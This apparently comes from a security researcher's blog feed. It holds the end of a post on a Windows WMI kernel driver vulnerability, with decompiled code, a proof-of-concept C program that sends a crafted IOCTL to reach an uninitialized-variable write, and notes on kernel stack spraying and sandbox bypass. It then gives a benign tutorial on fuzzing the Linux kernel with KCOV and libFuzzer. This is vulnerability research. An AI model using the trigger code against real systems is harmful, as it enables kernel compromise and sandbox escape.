     <span class="n">v40</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
     <span class="n">v38</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
     <span class="n">v44</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
     <span class="n">v41</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">v6</span><span class="p">)</span> 
<span class="p">{</span>
         <span class="k">do</span> <span class="p">{</span>
             <span class="n">v39</span> <span class="o">=</span> <span class="n">ObReferenceObjectByHandle</span><span class="p">(</span> <span class="o">*</span> <span class="p">(</span><span class="n">HANDLE</span> <span class="o">*</span> <span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">v41</span> <span class="o">+</span> <span class="mi">24</span><span class="p">),</span> <span class="mi">4</span> <span class="n">u</span><span class="p">,</span> <span class="n">WmipGuidObjectType</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">Object</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
             <span class="k">if</span> <span class="p">(</span><span class="n">v39</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">goto</span> <span class="n">LABEL_55</span><span class="p">;</span>
             <span class="n">v8</span> <span class="o">=</span> <span class="n">Object</span><span class="p">;</span>
             <span class="n">v9</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
             <span class="k">if</span> <span class="p">(</span><span class="n">v44</span><span class="p">)</span> <span class="p">{</span>
                 <span class="k">while</span> <span class="p">(</span><span class="n">Object</span> <span class="o">!=</span> <span class="o">*</span> <span class="p">((</span><span class="n">PVOID</span> <span class="o">*</span> <span class="p">)</span> <span class="n">LocalBuffer</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v9</span><span class="p">))</span> <span class="p">{.......</span>
                 <span class="p">}</span>
             <span class="p">}</span>
         <span class="p">}</span>
     <span class="p">}</span> <span class="c1">// because v42 and v45 is set to 0 we also bypass this two if </span>
<span class="k">if</span> <span class="p">(</span> <span class="n">v42</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">{</span> <span class="p">...</span> <span class="p">...</span> <span class="p">...</span> <span class="p">}</span> 
<span class="k">if</span> <span class="p">(</span> <span class="n">v45</span> <span class="o">|</span> <span class="n">BYTE3</span><span class="p">(</span><span class="n">PIRP</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="n">v13</span> <span class="o">=</span> <span class="n">v37</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v11</span> <span class="o">&amp;</span><span class="n">v37</span> <span class="p">)</span>
     
  <span class="o">*</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span> <span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">48</span><span class="p">)</span> <span class="o">=</span> <span class="n">v11</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span> <span class="p">)</span> <span class="n">v4</span> <span class="o">=</span> <span class="mi">56</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span> <span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">44</span><span class="p">)</span> <span class="o">=</span> <span class="mi">32</span><span class="p">;</span> <span class="o">*</span> <span class="n">OutputBufferSize</span> <span class="o">=</span> <span class="mi">56</span><span class="p">;</span>
     
     <span class="p">...</span>
     <span class="p">...</span>
     <span class="p">...</span>
 
 <span class="c1">//v16 come from user mode so we can set it's value 2 then lead code to here</span>
 
 <span class="k">if</span> <span class="p">(</span><span class="n">v16</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> 
<span class="p">{</span>
     <span class="nl">LABEL_54:</span>
         <span class="o">*</span> <span class="n">OutputBufferSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
     <span class="k">goto</span> <span class="n">LABEL_55</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="n">v39</span> <span class="o">=</span> <span class="n">ObReferenceObjectByHandle</span><span class="p">(</span> <span class="o">*</span> <span class="p">(</span><span class="n">HANDLE</span> <span class="o">*</span> <span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">16</span><span class="p">),</span> <span class="mh">0x43A</span> <span class="n">u</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">PIRP</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span><span class="n">v39</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="n">v39</span> <span class="o">=</span> <span class="n">ObOpenObjectByPointerWithTag</span><span class="p">((</span><span class="n">ULONG_PTR</span><span class="p">)</span> <span class="n">PIRP</span><span class="p">,</span> <span class="mi">512</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1FFFFF</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1953261124</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v35</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">v39</span><span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
 <span class="p">{</span>
         <span class="n">v23</span> <span class="o">=</span> <span class="o">*</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span> <span class="p">)</span> <span class="n">LocalBuffer</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span> <span class="p">)(</span><span class="n">v23</span> <span class="o">+</span> <span class="mi">60</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span> <span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span> <span class="c1">// write arbitrary data from uninitialized local variable</span></code></pre></figure>

<h1 id="advantages-of-the-vulnerability">Advantages of the vulnerability:</h1>
<ul>
  <li>The bug can be triggered even in low integrity contexts.</li>
  <li>It’s unrelated to win32k.sys, meaning it ignores the “Win32k system call disable policy”, for instance in Chrome browser.</li>
  <li>It works with the default OS configuration, providing a universal sandbox bypass.</li>
</ul>

<p>Sample POC for the vulnerability</p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="k">typedef</span> <span class="k">union</span> <span class="p">{</span>
    <span class="n">HANDLE</span> <span class="n">Handle</span><span class="p">;</span>
    <span class="n">ULONG64</span> <span class="n">Handle64</span><span class="p">;</span>
    <span class="n">ULONG32</span> <span class="n">Handle32</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">HANDLE3264</span><span class="p">,</span> <span class="o">*</span> <span class="n">PHANDLE3264</span><span class="p">;</span>
 
<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="c1">//</span>
    <span class="c1">// List of guid notification handles</span>
    <span class="c1">//</span>
    <span class="n">ULONG</span> <span class="n">HandleCount</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">Action</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="cm">/* PUSER_THREAD_START_ROUTINE */</span> <span class="n">UserModeCallback</span><span class="p">;</span>
    <span class="n">HANDLE3264</span> <span class="n">UserModeProcess</span><span class="p">;</span>
    <span class="n">HANDLE3264</span> <span class="n">Handles</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
<span class="p">}</span>
<span class="n">WMIRECEIVENOTIFICATION</span><span class="p">,</span> <span class="o">*</span> <span class="n">PWMIRECEIVENOTIFICATION</span><span class="p">;</span>
 
<span class="cp">#define RECEIVE_ACTION_CREATE_THREAD 2 // Mark guid objects as requiring
</span> 
<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="n">IN</span> <span class="n">VOID</span> <span class="o">*</span> <span class="n">ObjectAttributes</span><span class="p">;</span>
    <span class="n">IN</span> <span class="n">ACCESS_MASK</span> <span class="n">DesiredAccess</span><span class="p">;</span>
 
    <span class="n">OUT</span> <span class="n">HANDLE3264</span> <span class="n">Handle</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">WMIOPENGUIDBLOCK</span><span class="p">,</span> <span class="o">*</span> <span class="n">PWMIOPENGUIDBLOCK</span><span class="p">;</span>
 
<span class="cp">#define IOCTL_WMI_ENUMERATE_GUIDS\
CTL_CODE(FILE_DEVICE_UNKNOWN, WmiEnumerateGuidList, METHOD_BUFFERED, FILE_READ_ACCESS)
</span> 
<span class="kt">void</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">DWORD</span> <span class="n">dwBytesReturned</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">threadhandle</span><span class="p">;</span>
    <span class="n">WMIRECEIVENOTIFICATION</span> <span class="n">buffer</span><span class="p">;</span>
    <span class="n">CHAR</span> <span class="n">OutPut</span><span class="p">[</span><span class="mi">1000</span><span class="p">];</span>
 
    <span class="n">memset</span><span class="p">(</span> <span class="o">&amp;</span> <span class="n">amp</span><span class="p">;</span> <span class="n">buffer</span><span class="p">,</span> <span class="sc">'\x41'</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span> <span class="c1">// set ecx to 0x41414141</span>
    <span class="n">buffer</span><span class="p">.</span><span class="n">HandleCount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">buffer</span><span class="p">.</span><span class="n">Action</span> <span class="o">=</span> <span class="n">RECEIVE_ACTION_CREATE_THREAD</span><span class="p">;</span>
    <span class="n">buffer</span><span class="p">.</span><span class="n">UserModeProcess</span><span class="p">.</span><span class="n">Handle</span> <span class="o">=</span> <span class="n">GetCurrentProcess</span><span class="p">();</span> 
 
    <span class="c1">// using NtMapUserPhysicalPages for spraying stack cant help us</span>
 
    <span class="n">HANDLE</span> <span class="n">hDriver</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">WMIDataDevice"</span><span class="p">,</span> <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hDriver</span> <span class="o">!=</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">TRUE</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDriver</span><span class="p">,</span> <span class="n">IOCTL_WMI_RECEIVE_NOTIFICATIONS</span><span class="p">,</span> <span class="o">&amp;</span> <span class="n">amp</span><span class="p">;</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="o">&amp;</span> <span class="n">amp</span><span class="p">;</span> <span class="n">OutPut</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">OutPut</span><span class="p">),</span> <span class="o">&amp;</span> <span class="n">amp</span><span class="p">;</span> <span class="n">dwBytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
 
    <span class="p">}</span>
 
<span class="p">}</span></code></pre></figure>

<p>in order to exploit this vulnerablity we have to spary kernel stack memory, after talking with Mateusz Jurczyk he told me about 
<a href="https://j00ru.vexillium.org/2011/05/windows-kernel-stack-spraying-techniques/">using nt!NtMapUserPhysicalPages an excellent technique to Spraying Kernel Stack memory</a></p>

<p>with help of above method I managed to exploit this vulnerablity and I had a plan to participate to <code class="language-plaintext highlighter-rouge">Pwn2Own</code> in windows kernel catagorty, but Microsoft spotted my vulnerablity with a simple miskate I did by tweeting about it.</p>]]></content><author><name></name></author><category term="fuzzing" /><summary type="html"><![CDATA[Update:]]></summary></entry><entry><title type="html">Structure-Aware linux kernel Fuzzing with libFuzzer</title><link href="http://0.0.0.0:4000/fuzzing/2024/03/28/libffuzzerkernel.html" rel="alternate" type="text/html" title="Structure-Aware linux kernel Fuzzing with libFuzzer" /><published>2024-03-28T06:27:59+09:00</published><updated>2024-03-28T06:27:59+09:00</updated><id>http://0.0.0.0:4000/fuzzing/2024/03/28/libffuzzerkernel</id><content type="html" xml:base="http://0.0.0.0:4000/fuzzing/2024/03/28/libffuzzerkernel.html"><![CDATA[<p>Hi everyone! I’m really happy to tell you about my experimenting adventure today.
I decided to experiment with <code class="language-plaintext highlighter-rouge">KCOV</code> and see how I can hook it into libfuzzer and boot the kernel without spending too much on building a root file system.</p>

<p>First of all why not just using syzkaller? because why not? this may cover more State space.</p>

<p>after some googling I found a very interesting blog post by <a href="https://blog.cloudflare.com/a-gentle-introduction-to-linux-kernel-fuzzing/">cloudflare</a></p>

<p>they have had answered my second question on how to boot newly built linux kernel with current root file system with 
<a href="https://github.com/amluto/virtme">virtme</a>
so basicall Virtme is a set of simple tools to run a virtualized Linux kernel that uses the host Linux distribution or a simple rootfs instead of a whole disk image.
Virtme is tiny, easy to use, and makes testing kernel changes quite simple.
I also borrowd some script from them.</p>

<p>So let’s get started:
clone virtme and linux kernel</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">git clone <span class="nt">--depth</span> 1 https://github.com/torvalds/linux.git
git clone <span class="nt">--depth</span> 1 https://github.com/amluto/virtme.git
<span class="nb">cd </span>linux</code></pre></figure>

<p>you have to enable kcov for all targets with <code class="language-plaintext highlighter-rouge">KCOV_INSTRUMENT_ALL</code> or specific makefile.
Enable KCOV in all “fs” subdirectory:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">find <span class="s2">"fs"</span> <span class="nt">-name</span> Makefile <span class="se">\</span>
    | xargs <span class="nt">-L1</span> <span class="nt">-I</span> <span class="o">{}</span> bash <span class="nt">-c</span> <span class="s1">'echo "KCOV_INSTRUMENT := y" &gt;&gt; {}'</span></code></pre></figure>

<p>then build linux kernel with <code class="language-plaintext highlighter-rouge">KCOV</code> and <code class="language-plaintext highlighter-rouge">KASAN</code> and some other flags needed by virtme</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">../virtme/virtme-configkernel  <span class="nt">--defconfig</span>
 
 ./scripts/config <span class="se">\</span>
    <span class="nt">-e</span> KCOV <span class="se">\</span>
    <span class="nt">-d</span> KCOV_INSTRUMENT_ALL <span class="se">\</span>
    <span class="nt">-e</span> KCOV_ENABLE_COMPARISONS
   
   
./scripts/config <span class="se">\</span>
    <span class="nt">-e</span> DEBUG_FS <span class="nt">-e</span> DEBUG_INFO <span class="se">\</span>
    <span class="nt">-e</span> KALLSYMS <span class="nt">-e</span> KALLSYMS_ALL <span class="se">\</span>
    <span class="nt">-e</span> NAMESPACES <span class="nt">-e</span> UTS_NS <span class="nt">-e</span> IPC_NS <span class="nt">-e</span> PID_NS <span class="nt">-e</span> NET_NS <span class="nt">-e</span> USER_NS <span class="se">\</span>
    <span class="nt">-e</span> CGROUP_PIDS <span class="nt">-e</span> MEMCG <span class="nt">-e</span> CONFIGFS_FS <span class="nt">-e</span> SECURITYFS <span class="se">\</span>
    <span class="nt">-e</span> KASAN <span class="nt">-e</span> KASAN_INLINE <span class="nt">-e</span> WARNING <span class="se">\</span>
    <span class="nt">-e</span> FAULT_INJECTION <span class="nt">-e</span> FAULT_INJECTION_DEBUG_FS <span class="se">\</span>
    <span class="nt">-e</span> FAILSLAB <span class="nt">-e</span> FAIL_PAGE_ALLOC <span class="se">\</span>
    <span class="nt">-e</span> FAIL_MAKE_REQUEST <span class="nt">-e</span> FAIL_IO_TIMEOUT <span class="nt">-e</span> FAIL_FUTEX <span class="se">\</span>
    <span class="nt">-e</span> LOCKDEP <span class="nt">-e</span> PROVE_LOCKING <span class="se">\</span>
    <span class="nt">-e</span> DEBUG_ATOMIC_SLEEP <span class="se">\</span>
    <span class="nt">-e</span> PROVE_RCU <span class="nt">-e</span> DEBUG_VM <span class="se">\</span>
    <span class="nt">-e</span> REFCOUNT_FULL <span class="nt">-e</span> FORTIFY_SOURCE <span class="se">\</span>
    <span class="nt">-e</span> HARDENED_USERCOPY <span class="nt">-e</span> LOCKUP_DETECTOR <span class="se">\</span>
    <span class="nt">-e</span> SOFTLOCKUP_DETECTOR <span class="nt">-e</span> HARDLOCKUP_DETECTOR <span class="se">\</span>
    <span class="nt">-e</span> BOOTPARAM_HARDLOCKUP_PANIC <span class="se">\</span>
    <span class="nt">-e</span> DETECT_HUNG_TASK <span class="nt">-e</span> WQ_WATCHDOG <span class="se">\</span>
    <span class="nt">--set-val</span> DEFAULT_HUNG_TASK_TIMEOUT 140 <span class="se">\</span>
    <span class="nt">--set-val</span> RCU_CPU_STALL_TIMEOUT 100 <span class="se">\</span>
    <span class="nt">-e</span> UBSAN <span class="se">\</span>
    <span class="nt">-d</span> RANDOMIZE_BASE</code></pre></figure>

<p>in order to provied kenrnel code coverage to libfuzzer we can use <code class="language-plaintext highlighter-rouge">__libfuzzer_extra_counters</code>, you can see a good example  in <a href="https://github.com/google/syzkaller/blob/master/tools/kcovfuzzer/kcovfuzzer.c">syzkaller</a>
and its documentation in <a href="https://docs.kernel.org/dev-tools/kcov.html">kernel website</a></p>

<p>almost every kernel attack vector is Stateful APIs. you can’t just feed raw buffer to it. we have to use Structure-Aware Fuzzing, I deciede to use libprotobuf-mutator, which has show is very powerfull tool.</p>

<ul>
  <li><a href="https://powerofcommunity.net/poc2018/ned.pdf">poc2018</a></li>
  <li><a href="https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html">project zero blog</a></li>
  <li><a href="https://chromium.googlesource.com/chromium/src/+/main/testing/libfuzzer/libprotobuf-mutator.md">chromium</a></li>
</ul>

<p>there are tons of resource out there about using libprotobuf-mutator.
I can’t explain better then original google fuzzing doc</p>

<blockquote>
  <p>Protocol Buffers As Intermediate Format
Protobufs provide a convenient way to serialize structured data, and LPM provides an easy way to mutate protobufs for structure-aware fuzzing. Thus, it is tempting to use libFuzzer+LPM for APIs that consume structured data other than protobufs.</p>
</blockquote>

<p>but simply clone the repo and replace following code with <a href="https://github.com/google/libprotobuf-mutator/blob/master/examples/libfuzzer/libfuzzer_bin_example.cc">this file</a></p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="o">:</span><span class="c1">//github.com/google/libprotobuf-mutator.git</span></code></pre></figure>

<p>you can comment out other files in CMakeLists.txt because we want to modify .proto file.</p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&lt;cmath&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">"examples/libfuzzer/libfuzzer_example.pb.h"</span><span class="cp">
#include</span> <span class="cpf">"port/protobuf.h"</span><span class="cp">
#include</span> <span class="cpf">"src/libfuzzer/libfuzzer_macro.h"</span><span class="cp">
#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/bpf.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;memory.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdarg.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="kt">void</span> <span class="nf">fail</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">msg</span><span class="p">,</span> <span class="p">...);</span>
<span class="kt">void</span> <span class="nf">kcov_start</span><span class="p">();</span>
<span class="kt">void</span> <span class="nf">kcov_stop</span><span class="p">();</span>
<span class="cp">#define KCOV_COVER_SIZE (256 &lt;&lt; 10)
#define KCOV_TRACE_PC 0
#define KCOV_INIT_TRACE64 _IOR('c', 1, uint64_t)
#define KCOV_ENABLE _IO('c', 100)
</span>
<span class="n">__attribute__</span><span class="p">((</span><span class="n">section</span><span class="p">(</span><span class="s">"__libfuzzer_extra_counters"</span><span class="p">)))</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">libfuzzer_coverage</span><span class="p">[</span><span class="mi">32</span> <span class="o">&lt;&lt;</span> <span class="mi">10</span><span class="p">];</span>
<span class="kt">uint64_t</span><span class="o">*</span> <span class="n">kcov_data</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">kcov</span><span class="p">;</span>
<span class="k">extern</span> <span class="s">"C"</span> <span class="kt">int</span> <span class="nf">LLVMFuzzerInitialize</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">***</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
	
	<span class="n">kcov</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/sys/kernel/debug/kcov"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">kcov</span> <span class="err">`</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
		<span class="n">fail</span><span class="p">(</span><span class="s">"open of /sys/kernel/debug/kcov failed"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">kcov</span><span class="p">,</span> <span class="n">KCOV_INIT_TRACE64</span><span class="p">,</span> <span class="n">KCOV_COVER_SIZE</span><span class="p">))</span>
		<span class="n">fail</span><span class="p">(</span><span class="s">"init trace write failed"</span><span class="p">);</span>
	<span class="n">kcov_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">KCOV_COVER_SIZE</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kcov_data</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span>
				    <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">kcov</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">kcov_data</span> <span class="err">`</span><span class="n">MAP_FAILED</span><span class="p">)</span>
		<span class="n">fail</span><span class="p">(</span><span class="s">"mmap failed"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">kcov</span><span class="p">,</span> <span class="n">KCOV_ENABLE</span><span class="p">,</span> <span class="n">KCOV_TRACE_PC</span><span class="p">))</span>
		<span class="n">fail</span><span class="p">(</span><span class="s">"enable write trace failed"</span><span class="p">);</span>
	<span class="c1">//close(kcov); // where to close this?</span>

 	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="n">kcov_start</span><span class="p">()</span>
<span class="p">{</span>
	<span class="n">__atomic_store_n</span><span class="p">(</span><span class="o">&amp;</span><span class="n">kcov_data</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="n">__ATOMIC_RELAXED</span><span class="p">);</span>
 	 <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">kcov</span><span class="p">,</span> <span class="n">KCOV_ENABLE</span><span class="p">,</span> <span class="n">KCOV_TRACE_PC</span><span class="p">))</span>
             <span class="n">perror</span><span class="p">(</span><span class="s">"ioctl"</span><span class="p">),</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="n">kcov_stop</span><span class="p">()</span>
<span class="p">{</span>
	<span class="kt">uint64_t</span> <span class="n">ncov</span> <span class="o">=</span> <span class="n">__atomic_load_n</span><span class="p">(</span><span class="o">&amp;</span><span class="n">kcov_data</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">__ATOMIC_RELAXED</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ncov</span> <span class="o">&gt;=</span> <span class="n">KCOV_COVER_SIZE</span><span class="p">)</span>
		<span class="n">fail</span><span class="p">(</span><span class="s">"too much cover: %llu"</span><span class="p">,</span> <span class="n">ncov</span><span class="p">);</span>
	<span class="k">for</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">ncov</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="kt">uint64_t</span> <span class="n">pc</span> <span class="o">=</span> <span class="n">__atomic_load_n</span><span class="p">(</span><span class="o">&amp;</span><span class="n">kcov_data</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">],</span> <span class="n">__ATOMIC_RELAXED</span><span class="p">);</span>
		<span class="n">libfuzzer_coverage</span><span class="p">[</span><span class="n">pc</span> <span class="o">%</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">libfuzzer_coverage</span><span class="p">)]</span><span class="o">++</span><span class="p">;</span>
	<span class="p">}</span>
 	<span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">kcov</span><span class="p">,</span> <span class="n">KCOV_DISABLE</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
            <span class="n">perror</span><span class="p">(</span><span class="s">"ioctl"</span><span class="p">),</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="n">fail</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">msg</span><span class="p">,</span> <span class="p">...)</span>
<span class="p">{</span>
	<span class="kt">int</span> <span class="n">e</span> <span class="o">=</span> <span class="n">errno</span><span class="p">;</span>
	<span class="kt">va_list</span> <span class="n">args</span><span class="p">;</span>
	<span class="n">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">msg</span><span class="p">);</span>
	<span class="n">vfprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="n">msg</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
	<span class="n">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
	<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">" (errno %d)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">e</span><span class="p">);</span>
	<span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">DEFINE_PROTO_FUZZER</span><span class="p">(</span><span class="k">const</span> <span class="n">libfuzzer_example</span><span class="o">::</span><span class="n">Msg</span><span class="o">&amp;</span> <span class="n">message</span><span class="p">)</span> <span class="p">{</span>
<span class="n">protobuf_mutator</span><span class="o">::</span><span class="n">protobuf</span><span class="o">::</span><span class="n">FileDescriptorProto</span> <span class="n">file</span><span class="p">;</span>

        <span class="n">kcov_start</span><span class="p">();</span>
        <span class="c1">// your logic should be here:</span>

        <span class="c1">// std::cerr &lt;&lt; message.DebugString() &lt;&lt; "\n";	</span>
        <span class="c1">// Emulate a bug.</span>
        <span class="c1">//int fd = syscall(SYS_open, "example.txt", 4, message.sample_int());</span>
        <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_open</span><span class="p">,</span> <span class="s">"example.txt"</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x4141</span><span class="p">);</span>
        <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_close</span><span class="p">,</span><span class="n">fd</span><span class="p">);</span>

        <span class="n">kcov_stop</span><span class="p">();</span>
<span class="p">}</span></code></pre></figure>

<p>for test you can use <a href="https://github.com/googleprojectzero/SockFuzzer/tree/main">SockFuzzer</a> to fuzz network stack.</p>

<p>The intriguing phase starts. If a kasan panics, libfuzzer lacks awareness and will dispose of the sample. Therefore, to preserve the triggering sample of the crash, we must inform libfuzzer about the kernel panic.</p>

